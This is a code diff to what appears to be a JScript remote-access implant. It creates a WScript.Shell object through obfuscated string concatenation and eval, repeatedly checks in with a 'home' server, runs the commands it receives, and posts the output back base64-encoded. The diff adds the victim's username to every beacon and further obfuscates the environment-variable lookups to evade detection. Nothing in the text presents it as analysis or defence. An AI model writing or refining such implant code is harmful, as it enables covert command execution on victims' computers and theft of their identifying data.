@@ -15,8 +15,9 @@ var contentType = "text/xml"
 var x = "iveXOb"
 eval("var runner = new Act"+x+"ject(\"WScr\" +   \"ipt.Sh\"+  \"ell\")")
 
-var temp = runner.ExpandEnvironmentStrings("%TEMP%");
+var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
 var cs = runner.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
+var un = runner.ExpandEnvironmentStrings("%US"+  "ER"+"NA"+  "ME%");
 
 var curcmnd = '{"cmnd": ""}'
 var retval = ""
@@ -94,12 +95,11 @@ function b64(data) {
 //Main
 while(true)
 {
-  var checkin = '{"type": "' + type + '","id": ' + id +'}';
-  var serverMsg = post(home, checkin);
-
   try
   {
-	var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]
+    var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'"}';
+    var serverMsg = post(home, checkin);
+	  var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]
 
     if (curcmnd != jsondata) {
 	    curcmnd = jsondata
@@ -133,7 +133,7 @@ while(true)
 		  retval = "[!] Error getting output"
 		}
 	  }
-      var resp = '{"type": "' + type + '", "id": ' + id + ',"retval":"' + b64(retval) + '"}';
+      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","retval":"'+b64(retval)+'"}';
       post(home, resp)
     }
   }
